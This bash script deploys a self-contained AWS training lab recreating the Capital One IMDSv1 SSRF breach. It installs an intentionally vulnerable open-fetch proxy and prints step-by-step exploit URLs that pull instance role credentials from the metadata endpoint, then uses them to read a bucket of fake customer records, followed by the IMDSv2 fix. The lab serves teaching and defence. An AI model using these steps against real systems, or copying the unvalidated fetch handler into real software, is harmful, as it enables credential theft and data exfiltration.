#!/usr/bin/env bash
# One-command Capital One-shaped IMDSv1 SSRF lab.
# Requires: aws CLI v2, permissions to create EC2/IAM/S3/SSM in the target account.
set -euo pipefail

REGION="${AWS_REGION:-${AWS_DEFAULT_REGION:-us-east-1}}"
NAME="capone-imds-lab"
SUFFIX="$(openssl rand -hex 4)"
BUCKET="imds-ssrf-lab-${SUFFIX}"
ROLE="${NAME}-instance"
PROFILE_NAME="${NAME}-instance"
SG_NAME="${NAME}-web"
INSTANCE_NAME="${NAME}-web"

echo "==> identity / region"
ID_JSON="$(aws sts get-caller-identity --output json)"
ACCOUNT="$(python3 -c "import json,sys; print(json.load(sys.stdin)['Account'])" <<<"$ID_JSON")"
ARN="$(python3 -c "import json,sys; print(json.load(sys.stdin)['Arn'])" <<<"$ID_JSON")"
echo "    account=$ACCOUNT"
echo "    arn=$ARN"
echo "    region=$REGION"
echo "    bucket=$BUCKET"

AMI="$(aws ssm get-parameters \
  --names /aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-x86_64 \
  --region "$REGION" \
  --query 'Parameters[0].Value' --output text)"

VPC="$(aws ec2 describe-vpcs --region "$REGION" --filters Name=isDefault,Values=true \
  --query 'Vpcs[0].VpcId' --output text)"
if [[ -z "$VPC" || "$VPC" == "None" ]]; then
  echo "No default VPC in $REGION. Create one or set a subnet yourself." >&2
  exit 1
fi
SUBNET="$(aws ec2 describe-subnets --region "$REGION" \
  --filters Name=vpc-id,Values="$VPC" Name=default-for-az,Values=true \
  --query 'Subnets[0].SubnetId' --output text)"

echo "==> S3 bucket (private) + sample object"
aws s3api create-bucket --bucket "$BUCKET" --region "$REGION" \
  $([[ "$REGION" == "us-east-1" ]] || echo --create-bucket-configuration LocationConstraint="$REGION") >/dev/null
aws s3api put-public-access-block --bucket "$BUCKET" --public-access-block-configuration \
  BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true
aws s3api put-bucket-tagging --bucket "$BUCKET" --tagging "TagSet=[{Key=Project,Value=${NAME}}]"
TMPOBJ="$(mktemp)"
cat >"$TMPOBJ" <<'EOF'
CONFIDENTIAL - LAB DATA ONLY (fake)
account_id,name,card_last4
1001,A. Rivera,4412
1002,J. Chen,7781
1003,M. Okonkwo,9920
note: This file exists only to demonstrate IMDSv1 credential theft.
EOF
aws s3 cp "$TMPOBJ" "s3://${BUCKET}/secret/customer-records.txt" --region "$REGION" >/dev/null
rm -f "$TMPOBJ"

echo "==> instance role (list buckets + read this bucket only)"
if ! aws iam get-role --role-name "$ROLE" >/dev/null 2>&1; then
  aws iam create-role --role-name "$ROLE" --tags "Key=Project,Value=${NAME}" \
    --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ec2.amazonaws.com"},"Action":"sts:AssumeRole"}]}' >/dev/null
fi
POLICY="$(cat <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {"Sid":"ListBuckets","Effect":"Allow","Action":"s3:ListAllMyBuckets","Resource":"*"},
    {"Sid":"ReadLabBucket","Effect":"Allow","Action":["s3:GetObject","s3:ListBucket"],
     "Resource":["arn:aws:s3:::${BUCKET}","arn:aws:s3:::${BUCKET}/*"]}
  ]
}
EOF
)"
aws iam put-role-policy --role-name "$ROLE" --policy-name s3-read --policy-document "$POLICY"
aws iam attach-role-policy --role-name "$ROLE" \
  --policy-arn arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore >/dev/null 2>&1 || true
if ! aws iam get-instance-profile --instance-profile-name "$PROFILE_NAME" >/dev/null 2>&1; then
  aws iam create-instance-profile --instance-profile-name "$PROFILE_NAME" --tags "Key=Project,Value=${NAME}" >/dev/null
  aws iam add-role-to-instance-profile --instance-profile-name "$PROFILE_NAME" --role-name "$ROLE"
fi
echo "    waiting for instance profile..."
sleep 12

echo "==> security group (tcp/80)"
SG="$(aws ec2 create-security-group --region "$REGION" --group-name "$SG_NAME-$SUFFIX" \
  --description "IMDSv1 SSRF lab - port 80" --vpc-id "$VPC" \
  --tag-specifications "ResourceType=security-group,Tags=[{Key=Project,Value=${NAME}},{Key=Name,Value=${SG_NAME}}]" \
  --query GroupId --output text)"
aws ec2 authorize-security-group-ingress --region "$REGION" --group-id "$SG" \
  --protocol tcp --port 80 --cidr 0.0.0.0/0 >/dev/null

USERDATA="$(mktemp)"
cat >"$USERDATA" <<'UD'
#!/bin/bash
set -eux
exec > /var/log/capone-imds-lab.log 2>&1
dnf install -y nginx python3
cat > /opt/ssrf-demo.py << 'PY'
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import urllib.request

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        u = urlparse(self.path)
        url = parse_qs(u.query).get("url", [""])[0]
        if url:
            try:
                req = urllib.request.Request(url, method="GET")
                with urllib.request.urlopen(req, timeout=5) as r:
                    body = r.read()
                    ctype = r.headers.get("Content-Type", "text/plain; charset=utf-8")
                self.send_response(200)
                self.send_header("Content-Type", ctype)
                self.end_headers()
                self.wfile.write(body)
            except Exception as e:
                self.send_response(502)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.end_headers()
                self.wfile.write(str(e).encode())
            return
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.end_headers()
        self.wfile.write(b"ok\n")
    def log_message(self, fmt, *args):
        print(fmt % args)

if __name__ == "__main__":
    HTTPServer(("127.0.0.1", 8080), H).serve_forever()
PY
chmod 755 /opt/ssrf-demo.py
cat > /etc/systemd/system/ssrf-demo.service << 'UNIT'
[Unit]
Description=SSRF demo
After=network.target
[Service]
ExecStart=/usr/bin/python3 /opt/ssrf-demo.py
Restart=always
[Install]
WantedBy=multi-user.target
UNIT
systemctl daemon-reload
systemctl enable --now ssrf-demo
cat > /etc/nginx/conf.d/ssrf.conf << 'NGX'
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    server_name _;
    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header Host $host;
    }
}
NGX
systemctl enable --now nginx
nginx -s reload || systemctl restart nginx
echo READY > /tmp/lab-ready
UD

echo "==> EC2 t3.micro, IMDSv1 (HttpTokens=optional)"
IID="$(aws ec2 run-instances --region "$REGION" \
  --image-id "$AMI" --instance-type t3.micro \
  --subnet-id "$SUBNET" --security-group-ids "$SG" \
  --iam-instance-profile "Name=${PROFILE_NAME}" \
  --metadata-options HttpTokens=optional,HttpEndpoint=enabled,HttpPutResponseHopLimit=1 \
  --user-data "file://${USERDATA}" \
  --tag-specifications "ResourceType=instance,Tags=[{Key=Project,Value=${NAME}},{Key=Name,Value=${INSTANCE_NAME}},{Key=LabBucket,Value=${BUCKET}}]" \
  --query 'Instances[0].InstanceId' --output text)"
rm -f "$USERDATA"
echo "    instance=$IID"
aws ec2 wait instance-running --region "$REGION" --instance-ids "$IID"
PUB="$(aws ec2 describe-instances --region "$REGION" --instance-ids "$IID" \
  --query 'Reservations[0].Instances[0].PublicIpAddress' --output text)"
echo "    public_ip=$PUB"
echo "    waiting for nginx (user-data install)..."
for i in $(seq 1 36); do
  if curl -fsS -m 3 "http://${PUB}/" >/dev/null 2>&1; then
    echo "    http ready"
    break
  fi
  sleep 5
done

cat <<EOF

============================================================
Lab is up. IMDSv1 is allowed (HttpTokens=optional).

Public IP:     $PUB
Bucket:        s3://$BUCKET/secret/customer-records.txt
Instance:      $IID
Role:          $ROLE

In the browser address bar, open:

  http://${PUB}/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

then:

  http://${PUB}/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}

Then, with the JSON keys (unset AWS_PROFILE):

  aws sts get-caller-identity
  aws s3 ls
  aws s3 ls s3://${BUCKET} --recursive
  aws s3 cp s3://${BUCKET}/secret/customer-records.txt -

Require IMDSv2:

  aws ec2 modify-instance-metadata-options --instance-id ${IID} --http-tokens required

Reload the same two browser URLs. Expect HTTP 401.

Destroy:

  ./destroy.sh

This opens port 80 to 0.0.0.0/0. Tear it down when you are done.
============================================================
EOF
